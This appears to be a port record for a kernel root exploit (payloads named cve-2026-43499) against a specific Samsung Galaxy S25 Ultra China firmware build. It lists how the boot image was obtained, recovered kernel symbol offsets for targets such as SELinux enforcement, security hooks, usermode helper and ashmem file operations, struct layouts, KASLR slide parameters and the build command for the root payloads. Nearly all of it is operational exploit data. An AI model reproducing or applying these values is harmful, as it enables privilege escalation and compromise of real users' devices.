# Galaxy S25 Ultra SM-S9380 / S9380ZCUBCZF1 port record

This record contains the exact inputs and derived values for the China (CHC) Galaxy S25 Ultra profile `pa3q-S9380ZCUBCZF1`.
The kernel is the Samsung abogki GKI 6.6 tree built for One UI 8 (Android 16, OS16 firmware).

## Firmware identity and acquisition

The AP firmware was streamed from the Samsung firmware package without a full extraction (only `boot.img.lz4` was pulled from the 22 GB `AP_*.tar.md5`):

```text
model: SM-S9380
device: pa3q
fingerprint: samsung/pa3qzcx/pa3q:16/BP4A.251205.006/S9380ZCUBCZF1_CHCBCZF1:user/release-keys
kernel release: 6.6.98-android16-6-6-abogkiS9380ZCUBCZF1
boot image: Android boot header v4, kernel size 0x2510000-class PE/COFF arm64 Image
```

## Symbol and BTF recovery

`vmlinux-to-elf` recovered the full static symbol table (110124 symbols) at image base `0xffffffc080000000`. The `.BTF` blob (6389100 bytes) was carved from the recovered ELF and parsed for the exploit-relevant struct layouts. Cross-validation: the `nfnetlink_log` logger name string, the `boot_id` sysctl table entry, and the unique `worker_thread -> schedule` call site were all confirmed in the raw kernel image.

| Macro/use | Symbol or derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d0eac` |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | instruction after the blocking `worker_thread -> schedule` call | `0x000d97ec` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017dac30` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022fae60` |
| `INIT_TASK_OFF` | `init_task` | `0x0230e4c0` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x0251cd80` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x0255f5c0` |
| `SELINUX_BLOB_SIZES_OFF` | `selinux_blob_sizes` | `0x017db828` |
| `SECURITY_HOOK_HEADS_OFF` | `security_hook_heads` | `0x017db0f0` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc.fops` (miscdevice) | `0x0247d7f0` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x0140b440` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d70dfc` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d714b8` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d7150c` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d7172c` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d717b4` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d71840` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x004954b8` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x004959e4` |
| `COPY_SPLICE_READ_OFF` | `copy_splice_read` | `0x00416970` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003c9450` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0124cdc8` |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `nfnetlink_log` logger name string (`nfulnl_logger`) | `0x0175e75d` |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | `nfulnl_logger` object | `0x02302278` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026426d8` |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | `random_table` `boot_id_data` pointer | `0x02439490` |

The BTF layouts match the shared 6.6.98 abogki S25-series build: `task_struct.pi_lock` at `2316`, `pi_waiters` at `2336`, `seccomp` at `2280`, `sched_task_group` at `0x348`; `rt_mutex_waiter.tree` at `0`, `pi_tree` at `0x28`, `task` at `0x50`, `wake_state` at `0x60`, `ww_ctx` at `0x68`; `configfs_buffer.page` at `16`, `needs_read_fill` at `80`, `bin_buffer` at `88`, `bin_buffer_size` at `96`; `file_operations.unlocked_ioctl` at `0x48`.

## P0 fingerprint and slide parameters

`p0_fingerprint.h` contains the 32-slide probe table (256 qwords). The P0 parameters are shared by every S25-series target: probe base `0x1f0000`, gate page `0x0e80`, `SKB_DATA_DELTA == -0xe80`, image base `0xffffffc080000000`.

## Build

```sh
make TARGET=pa3q-S9380ZCUBCZF1 ANDROID_NDK_HOME=/path/to/android-ndk
```

All four payloads build with the expected sizes: `cve-2026-43499` 96680, `cve-2026-43499-app.so` 125880, `cve-2026-43499-root` 26072, release `cve-2026-43499-app.so` 104128 bytes.

